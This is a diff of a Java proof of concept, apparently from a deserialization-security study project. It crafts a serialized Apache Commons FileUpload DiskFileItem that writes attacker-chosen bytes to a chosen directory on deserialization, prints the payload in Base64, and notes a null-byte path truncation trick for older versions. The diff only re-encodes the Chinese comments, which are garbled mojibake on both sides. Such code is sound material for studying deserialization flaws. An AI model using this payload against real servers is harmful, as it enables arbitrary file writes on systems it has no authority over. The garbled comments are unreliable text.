@@ -8,30 +8,30 @@ import java.lang.reflect.Field;
 import java.util.Base64;
 
 /**
- * FileItem ±íÊ¾ÔÚ multipart/form-data POST ÇëÇóÖĞ½ÓÊÕµ½µÄÎÄ¼ş»ò±íµ¥Ïî
- * DiskFileItem ÊÇ FileItem µÄÊµÏÖÀà£¬ÓÃÀ´·â×°Ò»¸öÇëÇóÏûÏ¢ÊµÌåÖĞµÄÈ«²¿ÏîÄ¿£¬ÔÚ FileUploadBase#parseRequest ½âÎöÊ±½øĞĞ·â×°
- * µ±ÉÏ´«µÄÎÄ¼şÏîÄ¿±È½ÏĞ¡Ê±£¬Ö±½Ó±£´æÔÚÄÚ´æÖĞ£¨ËÙ¶È±È½Ï¿ì£©£¬±È½Ï´óÊ±£¬ÒÔÁÙÊ±ÎÄ¼şµÄĞÎÊ½£¬±£´æÔÚ´ÅÅÌÁÙÊ±ÎÄ¼ş¼Ğ¡£
+ * FileItem è¡¨ç¤ºåœ¨ multipart/form-data POST è¯·æ±‚ä¸­æ¥æ”¶åˆ°çš„æ–‡ä»¶æˆ–è¡¨å•é¡¹
+ * DiskFileItem æ˜¯ FileItem çš„å®ç°ç±»ï¼Œç”¨æ¥å°è£…ä¸€ä¸ªè¯·æ±‚æ¶ˆæ¯å®ä½“ä¸­çš„å…¨éƒ¨é¡¹ç›®ï¼Œåœ¨ FileUploadBase#parseRequest è§£ææ—¶è¿›è¡Œå°è£…
+ * å½“ä¸Šä¼ çš„æ–‡ä»¶é¡¹ç›®æ¯”è¾ƒå°æ—¶ï¼Œç›´æ¥ä¿å­˜åœ¨å†…å­˜ä¸­ï¼ˆé€Ÿåº¦æ¯”è¾ƒå¿«ï¼‰ï¼Œæ¯”è¾ƒå¤§æ—¶ï¼Œä»¥ä¸´æ—¶æ–‡ä»¶çš„å½¢å¼ï¼Œä¿å­˜åœ¨ç£ç›˜ä¸´æ—¶æ–‡ä»¶å¤¹ã€‚
  *
- * kick-off gadget£ºorg.apache.commons.fileupload.disk.DiskFileItem#readObject()
- * sink gadget£ºorg.apache.commons.fileupload.disk.DiskFileItem#getOutputStream()
- * chain gadget£ºorg.apache.commons.beanutils.BeanComparator#compare()
+ * kick-off gadgetï¼šorg.apache.commons.fileupload.disk.DiskFileItem#readObject()
+ * sink gadgetï¼šorg.apache.commons.fileupload.disk.DiskFileItem#getOutputStream()
+ * chain gadgetï¼šorg.apache.commons.beanutils.BeanComparator#compare()
  *
- * ¼¸¸ö DiskFileItem ÀàÖĞµÄÊôĞÔ£º
- * repository£ºFile ÀàĞÍµÄ³ÉÔ±±äÁ¿£¬Èç¹ûÎÄ¼ş±£´æµ½Ó²ÅÌÉÏµÄ»°£¬±£´æµÄÎ»ÖÃ¡£
- * sizeThreshold£ºÎÄ¼ş´óĞ¡ãĞÖµ£¬Èç¹û³¬¹ıÕâ¸öÖµ£¬ÉÏ´«ÎÄ¼ş½«»á±»´¢´æÔÚÓ²ÅÌÉÏ¡£
- * fileName£ºÔ­Ê¼ÎÄ¼şÃû
- * dfos£ºÒ»¸ö DeferredFileOutputStream ¶ÔÏó£¬ÓÃÓÚ OutputStream µÄĞ´³ö
- * dfosFile£ºÒ»¸ö File ¶ÔÏó£¬ÔÊĞí¶ÔÆäĞòÁĞ»¯µÄ²Ù×÷
- * DiskFileItem ÖØĞ´ÁË readObject ·½·¨ÊµÏÖÁË×Ô¼ºµÄÂß¼­,Èç¹û·´ĞòÁĞ»¯Ò»¸ö´øÊı¾İµÄ DiskFileItem Àà£¬¾Í¿ÉÄÜ»á´¥·¢ÎÄ¼şµÄĞ´³ö²Ù×÷¡£
+ * å‡ ä¸ª DiskFileItem ç±»ä¸­çš„å±æ€§ï¼š
+ * repositoryï¼šFile ç±»å‹çš„æˆå‘˜å˜é‡ï¼Œå¦‚æœæ–‡ä»¶ä¿å­˜åˆ°ç¡¬ç›˜ä¸Šçš„è¯ï¼Œä¿å­˜çš„ä½ç½®ã€‚
+ * sizeThresholdï¼šæ–‡ä»¶å¤§å°é˜ˆå€¼ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªå€¼ï¼Œä¸Šä¼ æ–‡ä»¶å°†ä¼šè¢«å‚¨å­˜åœ¨ç¡¬ç›˜ä¸Šã€‚
+ * fileNameï¼šåŸå§‹æ–‡ä»¶å
+ * dfosï¼šä¸€ä¸ª DeferredFileOutputStream å¯¹è±¡ï¼Œç”¨äº OutputStream çš„å†™å‡º
+ * dfosFileï¼šä¸€ä¸ª File å¯¹è±¡ï¼Œå…è®¸å¯¹å…¶åºåˆ—åŒ–çš„æ“ä½œ
+ * DiskFileItem é‡å†™äº† readObject æ–¹æ³•å®ç°äº†è‡ªå·±çš„é€»è¾‘,å¦‚æœååºåˆ—åŒ–ä¸€ä¸ªå¸¦æ•°æ®çš„ DiskFileItem ç±»ï¼Œå°±å¯èƒ½ä¼šè§¦å‘æ–‡ä»¶çš„å†™å‡ºæ“ä½œã€‚
  *
- * DiskFileItemµÄĞòÁĞ»¯Âß¼­£¿
- * --Í¨¹ıdfos.isInMemory()·½·¨ÅĞ¶ÏÎÄ¼şÄÚÈİÊÇ·ñÔÚÄÚ´æÖĞ£¬Ò²¾ÍÊÇÍ¨¹ıÅĞ¶Ï written µÄ³¤¶ÈºÍ threshold ãĞÖµ³¤¶È´óĞ¡£¬Èç¹ûĞ´Èë´óÓÚãĞÖµ£¬Ôò»á±»Ğ´³öµ½ÎÄ¼şÖĞ£¬ÄÇ¾Í²»ÊÇ´æÔÚÄÚ´æÖĞÁË
- * --Èç¹ûÔÚÄÚ´æÖĞ£¬Ôò»áµ÷ÓÃ dfos.getData() ·½·¨»ñÈ¡´æÔÚ dfos ³ÉÔ±±äÁ¿ memoryOutputStream µÄ ByteArrayOutputStream ¶ÔÏó·ÅÔÚ cachedContent ÖĞ¡£
- * --Èç¹û²»ÔÚÄÚ´æÖĞ£¬Ôò»á½« cachedContent ÖÃÎª¿Õ£¬È»ºó½« dfosFile ¸³ÖµÎª dfos µÄ³ÉÔ±±äÁ¿ outputFile ¶ÔÏó¡£
- * --ÓÉÓÚ dfos ÊÇ transient ĞŞÊÎµÄ£¬²»ÄÜ±»·´ĞòÁĞ»¯£¬ËùÒÔÄÜ±»·´ĞòÁĞ»¯µÄÓĞ byte Êı×éÀàĞÍµÄ cachedContent ºÍ File ¶ÔÏóµÄ dfosFile¡£
- *DiskFileItem·´ĞòÁĞ»¯Âß¼­£¿
- * --µ÷ÓÃ getOutputStream() ·½·¨»ñÈ¡ OutputStream ¶ÔÏó£¬Êµ¼ÊÉÏÊÇ new ÁËÒ»¸ö DeferredFileOutputStream ¶ÔÏó£¬ÎÄ¼şÂ·¾¶Ê¹ÓÃ tempFile£¬Èç¹ûÎª¿ÕÊ¹ÓÃ repository£¬Èç¹û»¹Îª¿ÕÔòÊ¹ÓÃ System.getProperty("java.io.tmpdir")£¬ÎÄ¼şÃûÊ¹ÓÃ format("upload_%s_%s.tmp", UID, getUniqueId()) Éú³ÉËæ»úµÄÎÄ¼şÃû¡£
- * --Èç¹û cachedContent ²»Îª¿Õ£¬ÔòÖ±½Ó write£¬·ñÔò½« dfosFile ÎÄ¼şÄÚÈİ¿½±´µ½ OutputStream ÖĞĞ´³ö£¬²¢É¾³ı¡£
+ * DiskFileItemçš„åºåˆ—åŒ–é€»è¾‘ï¼Ÿ
+ * --é€šè¿‡dfos.isInMemory()æ–¹æ³•åˆ¤æ–­æ–‡ä»¶å†…å®¹æ˜¯å¦åœ¨å†…å­˜ä¸­ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡åˆ¤æ–­ written çš„é•¿åº¦å’Œ threshold é˜ˆå€¼é•¿åº¦å¤§å°ï¼Œå¦‚æœå†™å…¥å¤§äºé˜ˆå€¼ï¼Œåˆ™ä¼šè¢«å†™å‡ºåˆ°æ–‡ä»¶ä¸­ï¼Œé‚£å°±ä¸æ˜¯å­˜åœ¨å†…å­˜ä¸­äº†
+ * --å¦‚æœåœ¨å†…å­˜ä¸­ï¼Œåˆ™ä¼šè°ƒç”¨ dfos.getData() æ–¹æ³•è·å–å­˜åœ¨ dfos æˆå‘˜å˜é‡ memoryOutputStream çš„ ByteArrayOutputStream å¯¹è±¡æ”¾åœ¨ cachedContent ä¸­ã€‚
+ * --å¦‚æœä¸åœ¨å†…å­˜ä¸­ï¼Œåˆ™ä¼šå°† cachedContent ç½®ä¸ºç©ºï¼Œç„¶åå°† dfosFile èµ‹å€¼ä¸º dfos çš„æˆå‘˜å˜é‡ outputFile å¯¹è±¡ã€‚
+ * --ç”±äº dfos æ˜¯ transient ä¿®é¥°çš„ï¼Œä¸èƒ½è¢«ååºåˆ—åŒ–ï¼Œæ‰€ä»¥èƒ½è¢«ååºåˆ—åŒ–çš„æœ‰ byte æ•°ç»„ç±»å‹çš„ cachedContent å’Œ File å¯¹è±¡çš„ dfosFileã€‚
+ *DiskFileItemååºåˆ—åŒ–é€»è¾‘ï¼Ÿ
+ * --è°ƒç”¨ getOutputStream() æ–¹æ³•è·å– OutputStream å¯¹è±¡ï¼Œå®é™…ä¸Šæ˜¯ new äº†ä¸€ä¸ª DeferredFileOutputStream å¯¹è±¡ï¼Œæ–‡ä»¶è·¯å¾„ä½¿ç”¨ tempFileï¼Œå¦‚æœä¸ºç©ºä½¿ç”¨ repositoryï¼Œå¦‚æœè¿˜ä¸ºç©ºåˆ™ä½¿ç”¨ System.getProperty("java.io.tmpdir")ï¼Œæ–‡ä»¶åä½¿ç”¨ format("upload_%s_%s.tmp", UID, getUniqueId()) ç”Ÿæˆéšæœºçš„æ–‡ä»¶åã€‚
+ * --å¦‚æœ cachedContent ä¸ä¸ºç©ºï¼Œåˆ™ç›´æ¥ writeï¼Œå¦åˆ™å°† dfosFile æ–‡ä»¶å†…å®¹æ‹·è´åˆ° OutputStream ä¸­å†™å‡ºï¼Œå¹¶åˆ é™¤ã€‚
  *
  * DiskFileItem.readObject()
  *     DiskFileItem.getOutputStream()
@@ -43,40 +43,40 @@ public class FileUploadForWrite {
 
     public static void main(String[] args) throws Exception {
 
-        // ´´½¨ÎÄ¼şĞ´ÈëÄ¿Â¼ File ¶ÔÏó£¬ÒÔ¼°ÎÄ¼şĞ´ÈëÄÚÈİ
+        // åˆ›å»ºæ–‡ä»¶å†™å…¥ç›®å½• File å¯¹è±¡ï¼Œä»¥åŠæ–‡ä»¶å†™å…¥å†…å®¹
         String charset = "UTF-8";
         byte[] bytes   = "hahaha".getBytes(charset);
 
-        // ÔÚ 1.3 °æ±¾ÒÔÏÂ£¬¿ÉÒÔÊ¹ÓÃ \0 ½Ø¶Ï
+        // åœ¨ 1.3 ç‰ˆæœ¬ä»¥ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ \0 æˆªæ–­
         //File repository = new File("/Users/phoebe/Downloads/123.txt\0");
 
-        // ÔÚ 1.3.1 ¼°ÒÔÉÏ£¬Ö»ÄÜÖ¸¶¨Ä¿Â¼
-		File repository = new File("D:\\TestUpload");
+        // åœ¨ 1.3.1 åŠä»¥ä¸Šï¼Œåªèƒ½æŒ‡å®šç›®å½•
+        File repository = new File("D:\\TestUpload");
 
-        // ´´½¨ dfos ¶ÔÏó
+        // åˆ›å»º dfos å¯¹è±¡
         DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);
 
-        // Ê¹ÓÃ repository ³õÊ¼»¯·´ĞòÁĞ»¯µÄ DiskFileItem ¶ÔÏó
+        // ä½¿ç”¨ repository åˆå§‹åŒ–ååºåˆ—åŒ–çš„ DiskFileItem å¯¹è±¡
         DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);
 
-        // ĞòÁĞ»¯Ê± writeObject ÒªÇó dfos ²»ÄÜÎª null
+        // åºåˆ—åŒ–æ—¶ writeObject è¦æ±‚ dfos ä¸èƒ½ä¸º null
         Field dfosFile = DiskFileItem.class.getDeclaredField("dfos");
         dfosFile.setAccessible(true);
         dfosFile.set(diskFileItem, dfos);
 
-        // ·´Éä½« cachedContent Ğ´Èë
+        // åå°„å°† cachedContent å†™å…¥
         Field field2 = DiskFileItem.class.getDeclaredField("cachedContent");
         field2.setAccessible(true);
         field2.set(diskFileItem, bytes);
 
-        //ĞòÁĞ»¯
+        //åºåˆ—åŒ–
         ByteArrayOutputStream baor = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(baor);
         oos.writeObject(diskFileItem);
         oos.close();
         System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));
 
-        //·´ĞòÁĞ»¯
+        //ååºåˆ—åŒ–
         ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
         ObjectInputStream ois = new ObjectInputStream(bais);
         Object o = ois.readObject();
